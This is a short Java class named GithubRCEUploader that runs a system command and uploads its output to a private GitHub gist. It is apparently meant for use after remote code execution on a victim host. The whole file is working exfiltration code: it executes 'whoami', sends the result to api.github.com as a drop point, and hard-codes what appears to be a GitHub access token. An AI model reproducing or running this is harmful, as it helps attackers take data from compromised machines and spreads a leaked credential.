package com.example.githubuploader;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class GithubRCEUploader {

    private static final String TOKEN = "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";
    private static final String API_URL = "https://api.github.com/gists";
    private static final String DESCRIPTION = "RCE Output";
    private static final String FILENAME = "output.txt";

    public static void main(String[] args) {
        String output = executeCommand("whoami");
        uploadToGithub(output);
    }

    private static String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = new ProcessBuilder(command.split(" ")).start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
            process.waitFor();
        } catch (Exception e) {
            output.append("Error executing command: ").append(e.getMessage());
        }
        return output.toString().trim();
    }

    private static void uploadToGithub(String content) {
        String jsonBody = createJsonPayload(content);
        try {
            HttpURLConnection connection = createConnection();
            sendPayload(connection, jsonBody);
            printResponse(connection);
            connection.disconnect();
        } catch (Exception e) {
            System.err.println("Error uploading to GitHub: " + e.getMessage());
        }
    }

    private static HttpURLConnection createConnection() throws Exception {
        URL url = new URL(API_URL);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Authorization", "token " + TOKEN);
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
        connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
        connection.setDoOutput(true);
        return connection;
    }

    private static void sendPayload(HttpURLConnection connection, String jsonBody) throws Exception {
        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }
    }

    private static void printResponse(HttpURLConnection connection) throws Exception {
        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_CREATED) {
            System.out.println("RCE output uploaded successfully.");
        } else {
            System.err.println("Failed to upload RCE output. Response code: " + responseCode);
        }
    }

    private static String createJsonPayload(String content) {
        return String.format(
                "{ \"description\": \"%s\", \"public\": false, \"files\": { \"%s\": { \"content\": \"%s\" } } }",
                DESCRIPTION, FILENAME, content);
    }
}
